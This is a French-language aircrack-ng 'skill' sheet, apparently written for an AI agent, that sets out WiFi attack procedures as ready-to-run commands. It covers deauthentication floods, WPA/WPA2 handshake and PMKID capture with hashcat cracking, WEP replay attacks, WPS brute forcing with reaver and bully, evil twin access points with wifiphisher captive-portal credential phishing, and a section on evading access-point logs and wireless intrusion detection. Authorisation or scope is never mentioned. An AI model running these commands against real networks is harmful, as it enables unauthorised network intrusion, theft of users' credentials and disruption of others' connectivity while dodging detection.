---
name: aircrack-ng
description: Suite Aircrack-ng complète — mode monitor, capture WPA/WPA2 handshake, attaque PMKID, WEP cracking, WPA3, deauth, evil twin, aireplay-ng, et audit WiFi avancé.
---

# Aircrack-ng — Suite d'Audit WiFi

## Présentation

Aircrack-ng est la suite complète d'audit de réseaux WiFi. Elle permet de capturer des paquets, forcer des handshakes, cracker des clés WEP/WPA/WPA2.

**Composants** :
| Commande | Usage |
|----------|-------|
| **airmon-ng** | Passer une carte en mode monitor |
| **airodump-ng** | Capture de paquets WiFi |
| **aireplay-ng** | Injection de paquets (deauth, fake auth) |
| **aircrack-ng** | Cracking WEP/WPA |
| **airdecap-ng** | Déchiffrer des captures |
| **packetforge-ng** | Créer des paquets injectables |
| **besside-ng** | Capture automatisée de handshake |
| **airolib-ng** | Gestion de base de données WPA |

**Installation** :
```bash
sudo apt install aircrack-ng
# Vérifier que la carte supporte l'injection
sudo airmon-ng
```

---

## Mode Monitor

### Activer le mode monitor
```bash
# Lister les interfaces
iwconfig

# Tuer les processus qui interfèrent
sudo airmon-ng check kill

# Passer en mode monitor
sudo airmon-ng start wlan0
# → wlan0mon créé

# Mode monitor avec canal spécifique
sudo airmon-ng start wlan0 6    # Canal 6

# Revenir en mode managed
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

### Vérifier l'injection
```bash
# Tester l'injection de paquets
sudo aireplay-ng -9 wlan0mon

# Test avec carte specifique
sudo aireplay-ng -9 -i wlan1mon wlan0mon
```

---

## Airodump-ng — Capture de paquets

### Scan des réseaux
```bash
# Scanner tous les réseaux
sudo airodump-ng wlan0mon

# Scanner sur un canal spécifique
sudo airodump-ng -c 1,6,11 wlan0mon

# Scanner en bande 5GHz
sudo airodump-ng --band a wlan0mon    # 5GHz
sudo airodump-ng --band abg wlan0mon  # 2.4 + 5GHz
```

### Capture ciblée sur un réseau
```bash
# Capturer le trafic d'un AP spécifique
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Options :
#   -c 6                    : canal
#   --bssid AA:BB:CC:DD:EE:FF : AP cible
#   -w capture              : préfixe des fichiers de sortie
#   --encrypt WPA           : filtrer par chiffrement
#   --manufacturer          : afficher le fabricant
#   --output-format pcap,csv : formats de sortie
```

### Paramètres du scan
```
BSSID         : Adresse MAC de l'AP
PWR           : Puissance du signal (dBm) — plus négatif = plus faible
Beacons       : Nombre de beacon frames
#Data         : Paquets de données capturés
#/s           : Paquets par seconde
CH            : Canal
MB            : Vitesse max supportée
ENC           : Chiffrement (OPN, WEP, WPA, WPA2, WPA3)
CIPHER        : Algorithme (CCMP, TKIP, GCMP)
AUTH          : Authentification (PSK, MGT, SAE)
ESSID         : Nom du réseau
```

---

## Attaque WPA/WPA2 — Handshake

### 1. Capturer le handshake (méthode passive)
```bash
# Attendre qu'un client se connecte
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Le handshake s'affiche : "WPA handshake: AA:BB:CC:DD:EE:FF"
```

### 2. Forcer le handshake (deauth attack)
```bash
# Dans un terminal 1 : capturer
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Dans un terminal 2 : déauthentifier le client
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Options aireplay-ng -0 :
#   -0 5       : 5 paquets deauth (0 = infini)
#   -a AA:BB   : MAC de l'AP
#   -c 11:22   : MAC du client (optionnel = broadcast)
```

### 3. Crack le handshake avec aircrack-ng
```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Options :
#   -w wordlist.txt : wordlist
#   -e ESSID       : filtrer par ESSID
#   -b AA:BB       : filtrer par BSSID
#   -j hashfile    : sortie en format JTR
```

### 4. Crack avec Hashcat (GPU — beaucoup plus rapide)
```bash
# Convertir la capture en format hashcat
# Méthode 1 : aircrack-ng
sudo aircrack-ng capture-01.cap -J hash            # Sortie JTR
sudo aircrack-ng capture-01.cap -J hash 2>/dev/null

# Méthode 2 : cap2hccapx
cap2hccapx capture-01.cap output.hccapx

# Méthode 3 : hcxpcapngtool (PMKID + EAPOL)
hcxpcapngtool -o hash.22000 capture-01.cap

# Crack avec hashcat (mode 22000 pour WPA)
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt

# Mode 2500 pour hccapx
hashcat -m 2500 output.hccapx /usr/share/wordlists/rockyou.txt

# Mode 16800 pour PMKID (sans handshake)
hashcat -m 16800 pmkid_hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Attaque PMKID (sans client)

### Avantage : pas besoin de client connecté

```bash
# Capturer le PMKID avec hcxdumptool
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convertir pour hashcat
hcxpcapngtool -o hash.22000 capture.pcapng

# Crack
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
```

### Avec airodump-ng
```bash
# Certains AP envoient le PMKID dans les beacon/probe response
# Vérifier dans la capture :
tshark -r capture-01.cap -Y "wlan.fixed.pmkid" 2>/dev/null
```

---

## Attaque WEP

### 1. ARP Replay Attack (standard)
```bash
# Capturer
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Fake authentication
sudo aireplay-ng -1 0 -e ESSID -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# ARP replay
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Crack
sudo aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap
```

### 2. KoreK ChopChop Attack
```bash
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
# Génère un keystream
# Puis injecter avec packetforge-ng
```

### 3. Fragmentation Attack
```bash
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
```

---

## Attaque WPS

### Wash — Détection WPS
```bash
sudo wash -i wlan0mon
sudo wash -i wlan0mon -C    # Scan tous les canaux 2.4GHz
sudo airodump-ng wlan0mon --wps   # Alternative
```

### Bully — Crack WPS
```bash
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -e ESSID -c 6 -S -F -B

# Options :
#   -b BSSID   : AP cible
#   -e ESSID   : nom du réseau
#   -c canal   : canal
#   -S         : bruteforce lent mais fiable
#   -F         : force (ignore les warnings)
#   -B         : bruteforce
```

### Reaver — Crack WPS
```bash
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -N -vv

# Options :
#   -K 1       : pixie dust attack (plus rapide)
#   -N         : ne pas envoyer de NACK
#   -vv        : verbose
#   -d 2       : délai entre tentatives (secondes)
#   -L         : lock picked (évite de lock le WPS)

# Pixie dust (CVE-2014-1470) :
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -N -d 0
```

---

## Evil Twin Attack

### Avec airbase-ng (AP malveillant)
```bash
# 1. Créer un AP jumeau
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# 2. Avec bridge réseau
sudo airbase-ng -e "FreeWiFi" -c 6 -P -C 30 -W 1 wlan0mon \
    --bssid 00:11:22:33:44:55

# 3. Configurer NAT (partage de connexion)
sudo ifconfig at0 up
sudo iptables --flush
sudo iptables --table nat --flush
sudo iptables --append FORWARD --in-interface at0 -j ACCEPT
sudo iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward

# 4. DHCP sur at0
sudo dhcpd -cf /etc/dhcp/dhcpd.conf at0
```

### Evil Twin + Captive Portal
```bash
# Combiner avec hostapd + dnsmasq
# Voir le projet Fluxion, Wifiphisher, or EvilTwin Framework

# Wifiphisher (automatisé)
sudo wifiphisher -aI wlan0mon -jI wlan0 -p firmware-upgrade

# Fluxion
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion && sudo ./fluxion.sh
```

---

## WPA3 — Attaques

### WPA3 Dragonblood (CVE-2019-9494)
```bash
# Dragonblood : downgrade attack
# WPA3 → WPA2 transition mode

# Détection WPA3
sudo airodump-ng wlan0mon --wps
# WPA3 est chiffré avec GCMP (pas CCMP)

# Attaque par force brute SAE (Hashcat)
# Mode hashcat 22000 fonctionne aussi pour WPA3-Personal
hashcat -m 22000 -a 0 hash.22000 rockyou.txt
```

---

## Outils complémentaires

### Besside-ng — Capture automatisée
```bash
# Capture le handshake de tous les AP à proximité
sudo besside-ng wlan0mon

# Résultats dans besside.log + besside.cap
```

### Airolib-ng — Base de données WPA
```bash
# Créer une base de données
sudo airolib-ng wifi.db --import essid wordlist.txt
sudo airolib-ng wifi.db --import passwd rockyou.txt
sudo airolib-ng wifi.db --batch

# Utiliser avec aircrack-ng
sudo aircrack-ng -r wifi.db capture-01.cap
```

### Kismet — Détection WiFi avancée
```bash
sudo kismet -c wlan0mon
# Interface web : http://localhost:2501
```

---

## Scénarios complets

### 1. Audit WPA2 complet
```bash
# Étape 1 : Mode monitor
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Étape 2 : Scan
sudo airodump-ng wlan0mon

# Étape 3 : Capture ciblée
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Étape 4 : Deauth (force handshake)
sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF wlan0mon

# Étape 5 : Cracker
# Option A : aircrack-ng
sudo aircrack-ng -w rockyou.txt capture-01.cap
# Option B : hashcat
hcxpcapngtool -o hash.22000 capture-01.cap
hashcat -m 22000 hash.22000 rockyou.txt --force
```

### 2. Audit PMKID (sans client)
```bash
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
# Attendre ~30 secondes
hcxpcapngtool -o hash.22000 capture.pcapng
hashcat -m 22000 hash.22000 rockyou.txt --force
```

### 3. Test d'intrusion WEP
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
sudo aireplay-ng -1 0 -e ESSID -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
# Attendre 20000+ IVs
sudo aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap
```

### 4. Attaque Evil Twin + Captive Portal
```bash
# 1. Lancer wifiphisher (scénario captif)
sudo wifiphisher -aI wlan0mon -jI wlan0 -p oauth-login \
    --essid "Hotel WiFi"

# 2. Ou manuellement avec airbase-ng + dnsmasq
# Voir scripts comme l33t2 (https://github.com/s0lst1c3/eapeak)
```

---

## Évasion de détection

### Éviter les logs de l'AP
```bash
# Deauth lent (1 paquet toutes les 10 secondes)
while true; do
    sudo aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55 wlan0mon
    sleep 10
done

# Changer d'adresse MAC pour chaque attaque
sudo ifconfig wlan0mon down
sudo macchanger -r wlan0mon
sudo ifconfig wlan0mon up
```

### Contournement des WIPS (Wireless IDS/IPS)
```bash
# Ralentir les attaques
sudo aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55 \
    -D wlan0mon   # Mode debug (pas de démon)

# Éviter l'attaque deauth massive
# Utiliser PMKID à la place (pas de deauth)
```

---

## Dépannage

| Problème | Solution |
|----------|----------|
| "No such device" | Vérifier avec `iwconfig` ou `ip link` |
| Injection fails | `aireplay-ng -9 wlan0mon` pour tester |
| Can't find handshake | `airodump-ng` ne capture pas → `besside-ng` |
| Hashcat slow | Vérifier `hashcat -I`, utiliser -d 1 (GPU) |
| WPS locked | Attendre 30+ minutes ou changer de cible |
| Too many deauths | Réduire le nombre : `-0 1` au lieu de `-0 5` |

---

## Antisèche rapide

```bash
# Mode monitor
sudo airmon-ng start wlan0

# Scan
sudo airodump-ng wlan0mon

# Capture handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth pour forcer handshake
sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack
sudo aircrack-ng -w rockyou.txt capture-01.cap

# PMKID (alternative rapide)
sudo hcxdumptool -i wlan0mon -o capture.pcapng
hcxpcapngtool -o hash.22000 capture.pcapng
hashcat -m 22000 hash.22000 rockyou.txt --force

# WPS
sudo wash -i wlan0mon
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1

# Evil Twin
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# Cleanup
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```